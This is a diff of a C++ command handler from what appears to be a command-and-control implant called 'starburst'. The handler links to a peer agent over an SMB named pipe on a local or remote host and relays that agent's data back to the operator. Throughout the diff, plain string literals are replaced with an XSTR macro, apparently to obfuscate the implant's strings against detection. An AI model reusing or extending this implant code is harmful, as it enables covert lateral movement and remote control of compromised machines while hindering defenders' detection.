@@ -108,7 +108,7 @@ auto declfn starburst::cmd_link(
 
     if ( !pipename || pipe_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing pipe name" ) ) );
+            XSTR( "missing pipe name" ) );
         return;
     }
 
@@ -128,15 +128,15 @@ auto declfn starburst::cmd_link(
     }
 
     char pipe_path[520] = {};
-    str_copy( pipe_path, symbol<char*>( const_cast<char*>( "\\\\" ) ) );
+    str_copy( pipe_path, XSTR( "\\\\" ) );
 
     if ( host_buf[0] != '\0' ) {
         str_concat( pipe_path, host_buf );
     } else {
-        str_concat( pipe_path, symbol<char*>( const_cast<char*>( "." ) ) );
+        str_concat( pipe_path, XSTR( "." ) );
     }
 
-    str_concat( pipe_path, symbol<char*>( const_cast<char*>( "\\pipe\\" ) ) );
+    str_concat( pipe_path, XSTR( "\\pipe\\" ) );
     str_concat( pipe_path, pipe_buf );
 
     DBG_PRINT( inst, "link: connecting to %s\n", pipe_path );
@@ -153,7 +153,7 @@ auto declfn starburst::cmd_link(
 
     if ( h_remote == INVALID_HANDLE_VALUE ) {
         char err_buf[256] = {};
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "failed to connect to pipe: " ) ) );
+        str_copy( err_buf, XSTR( "failed to connect to pipe: " ) );
         str_concat( err_buf, pipe_path );
         queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
         return;
@@ -167,7 +167,7 @@ auto declfn starburst::cmd_link(
     if ( !link ) {
         inst.kernel32.CloseHandle( h_remote );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -199,7 +199,7 @@ auto declfn starburst::cmd_link(
         if ( link->pipe_name ) inst.heap_free( link->pipe_name );
         inst.heap_free( link );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no response from P2P agent" ) ) );
+            XSTR( "no response from P2P agent" ) );
         return;
     }
 
@@ -226,7 +226,7 @@ auto declfn starburst::cmd_link(
     if ( !pkg ) {
         inst.heap_free( p2p_data );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -234,7 +234,7 @@ auto declfn starburst::cmd_link(
     package_add_byte( inst, pkg, C2_PROFILE_SMB );
     package_add_int32( inst, pkg, link->link_id );
     package_add_string( inst, pkg, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "" ) ) );
+        XSTR( "" ) );
     package_add_bytes( inst, pkg, p2p_data, p2p_len );
 
     inst.heap_free( p2p_data );
@@ -263,11 +263,11 @@ auto declfn starburst::cmd_link(
     package_destroy( inst, pkg );
 
     char resp_buf[768] = {};
-    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Linked via " ) ) );
+    str_copy( resp_buf, XSTR( "Linked via " ) );
     str_concat( resp_buf, pipe_path );
-    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
+    str_concat( resp_buf, XSTR( "\nAgent: " ) );
     str_concat( resp_buf, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "unknown" ) ) );
+        XSTR( "unknown" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
 }
